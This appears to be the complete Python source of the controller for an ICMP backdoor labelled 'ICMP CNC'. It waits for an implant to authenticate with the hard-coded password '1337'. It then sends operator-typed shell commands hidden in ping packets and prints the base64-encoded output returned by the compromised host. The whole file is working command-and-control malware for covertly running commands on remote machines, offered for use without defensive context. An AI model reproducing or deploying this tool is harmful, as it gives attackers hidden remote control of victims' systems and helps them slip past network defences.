# By my-0day / p1s1o. Inspired by https://github.com/krabelize/icmpdoor

from scapy.all import sr,IP,ICMP,Raw,sniff
import threading
import argparse
import time
import json
import base64

class IcmpDoor():
    def __init__(self,interface):
        self.interface = interface
        self.p_id = 0
        self.sniffed = {}

        self.ICMP_ID = int(13170)
        self.TTL = int(64)

        self.destination_ip = False

        try:
            from scapy.all import sr,IP,ICMP,Raw,sniff
        except ImportError:
            print("Install the Py3 scapy module")
            raise SystemExit


    def sniffer(self):
        sniff(iface=self.interface, prn=self.shell, filter="icmp", store="0")

    def shell(self,pkt):
        if self.destination_ip != False:
            if pkt[IP].src == self.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == self.ICMP_ID and "p_id" in pkt[Raw].load.decode('utf-8', errors='ignore').replace('\n',''):
                
                icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
                
                icmp_json = json.loads(icmppacket)
                p_id = icmp_json["p_id"]
                b64_response = icmp_json["response"]
                response = base64.b64decode(b64_response.encode()).decode()

                self.sniffed[int(p_id)] = response
            else:
                pass
        else:
            icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
            try:
                auth_pkt_json = json.loads(icmppacket)
                if auth_pkt_json["Pwd"] == "1337":
                    self.destination_ip = pkt[IP].src
                    print("Got connection from: "+self.destination_ip)
                    payload = (IP(dst=self.destination_ip, ttl=self.TTL)/ICMP(type=8,id=self.ICMP_ID)/Raw(load="_4UTH*@_"))
                    sr(payload, timeout=0, verbose=0)
                    print("Sending payload")
                
            except Exception as e:
                print(e)


    def main(self):
        sniffing = threading.Thread(target=self.sniffer)
        sniffing.start()
        print("[+] ICMP CNC started.")
        print("Waiting for connection.")
        try:
            while True:
                if self.destination_ip != False:
                    icmpshell = input("$ ")
                    if icmpshell == 'exit':
                        print("[+] Stopping CNC.")
                        print("Bye bye.")
                        raise SystemExit
                    elif icmpshell == '':
                        pass
                    else:
                        self.p_id = self.p_id + 1
                        payload = (IP(dst=self.destination_ip, ttl=self.TTL)/ICMP(type=8,id=self.ICMP_ID)/Raw(load='{"p_id":"'+str(self.p_id)+'","cmd":"'+str(icmpshell)+'"}'))
                        sr(payload, timeout=0, verbose=0)
                        while self.p_id not in self.sniffed:
                            time.sleep(0.2)
                        print(self.sniffed[self.p_id])

                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\nBye bye.")
            raise SystemExit

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
args = parser.parse_args()
if __name__ == "__main__":
    IcmpD = IcmpDoor(args.interface)
    IcmpD.main()
